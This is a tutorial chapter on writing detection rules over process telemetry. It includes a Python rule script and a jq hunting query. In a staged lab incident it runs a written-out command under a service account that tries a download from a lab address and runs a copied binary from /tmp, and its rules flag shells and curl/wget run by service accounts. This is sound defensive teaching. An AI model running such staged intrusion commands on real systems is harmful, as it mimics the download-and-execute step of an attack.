---
title: Rules over the telemetry
version: 1
---

**A rule turns a pile of records into the few a person should read.** `web` will write hundreds of
process lines an hour doing nothing unusual, and nobody reads hundreds of lines an hour. A rule is
a description of something the machine's job never needs, checked against every line.

Good rules describe behaviour, not files, and the best ones come from knowing the machine. The
portal serves a page and checks its health. It never starts a shell, never downloads anything and
never runs a program out of `/tmp`. Each of those is a rule, and none of them needs to know what a
particular piece of malware looks like. Save this as `detect.py` in your home on `web`:

```schooling-example
{"language": "python", "file": "detect.py", "parts": [{"code": "#!/usr/bin/env python3\n\"\"\"detect.py: read the sensor's lines and print the ones a rule matches.\"\"\"\nimport json, os, sys\n\nSHELLS = {\"bash\", \"sh\", \"dash\"}", "note": "A detection rule is a question asked of every line of telemetry, and this file is three of them. The sensor collects; the rules decide what deserves a person's attention. Keeping the two apart is what lets a rule be changed and run again over yesterday's telemetry."}, {"code": "RULES = [\n    (\"a shell running as the portal's account\",\n     lambda e: e[\"user\"] == \"portal\" and os.path.basename(e[\"exe\"]) in SHELLS),\n    (\"a program run from /tmp or /dev/shm\",\n     lambda e: e[\"exe\"].startswith((\"/tmp/\", \"/dev/shm/\"))),\n    (\"a download tool run by a service account\",\n     lambda e: e[\"user\"] in {\"portal\", \"www-data\"} and os.path.basename(e[\"exe\"]) in {\"curl\", \"wget\"}),\n]", "note": "Each rule describes behaviour, never a file. The portal never needs a shell, so a shell as `portal` means something made it run one. `/tmp` and `/dev/shm` are writable by every account, so a program started from there is one somebody copied in. And a service account fetching things is the step that usually comes between those two."}, {"code": "for line in open(sys.argv[1]):\n    e = json.loads(line)\n    for name, rule in RULES:\n        if rule(e):\n            print(f'{e[\"time\"]} {e[\"host\"]} {name}: pid {e[\"pid\"]} '\n                  f'{e[\"cmd\"]!r} under {\" < \".join(e[\"parents\"])}')", "note": "An alert carries what an analyst needs to start: when, where, which rule, the process and its parents, read left to right from child to grandparent."}]}
```

## An incident, staged in your own lab

Now make the portal's account do what it never does. `sudo -u portal` stands in for whatever, in
real life, makes a web application run a command it was not written to run; on your own machine it
is simply you, borrowing the account. The command tries a download from `192.168.60.99`, an address
where nothing answers, copies `/bin/sleep` to `/tmp/update`, and leaves that copy running for ten
minutes:

```
ana@web:~$ sudo -u portal bash -c 'curl -s -m 2 http://192.168.60.99/x; cp /bin/sleep /tmp/update; /tmp/update 600 &'
```

The prompt came straight back, and nothing on `web` looks different: the portal still serves its
page, and no file anybody would scan has changed. Ask the rules:

```
ana@web:~$ python3 detect.py /var/log/sensor.jsonl
2026-10-23T02:02:07-0300 web a shell running as the portal's account: pid 190 'bash -c curl -s -m 2 http://192.168.60.99/x; cp /bin/sleep /tmp/update; /tmp/update 600 &' under sudo < su
2026-10-23T02:02:07-0300 web a download tool run by a service account: pid 191 'curl -s -m 2 http://192.168.60.99/x' under bash < sudo < su
2026-10-23T02:02:09-0300 web a program run from /tmp or /dev/shm: pid 193 '/tmp/update 600' under 
```

**Three alerts, one per rule, two seconds apart**, and read in order they are the story: a shell as
`portal`, a download tool started by that shell, and a program running from `/tmp`. The first two
carry their parents, `sudo < su`, which in your lab is you. In a real incident that is where the
web server's own processes would be, and that chain is what an analyst would follow first.

The third alert has nothing after `under`. `/tmp/update` was started by the shell, the shell ended
at once, and by the time the sensor looked, the program's parent was process 1. This is the gap of
the last section showing up as a missing fact: **the record does not say who started the program
that is still running**, and only the alerts before it, matched by time, put it back.

## Asking a question no rule asked

Rules only find what somebody thought of. **Hunting** is asking the stored telemetry a new question
after the fact, and with one JSON object per line, `jq` is enough. Everything the portal's account
ever ran:

```
ana@web:~$ jq -r 'select(.user == "portal") | [.time, .cmd] | @tsv' /var/log/sensor.jsonl
2026-10-23T02:02:07-0300	bash -c curl -s -m 2 http://192.168.60.99/x; cp /bin/sleep /tmp/update; /tmp/update 600 &
2026-10-23T02:02:07-0300	curl -s -m 2 http://192.168.60.99/x
2026-10-23T02:02:09-0300	/tmp/update 600
```

Three lines, where a portal doing its job would show none, and the one that is missing says as much
as the three. The shell ran `cp` between the download and `/tmp/update`, and the process ids show
the hole it left: 191, then 193. **Process 192 was the copy, and it finished between two looks.** A
hunt over telemetry is only as complete as the sensor, which is the argument of the last section.
A hunt that finds something worth an alert becomes a rule.
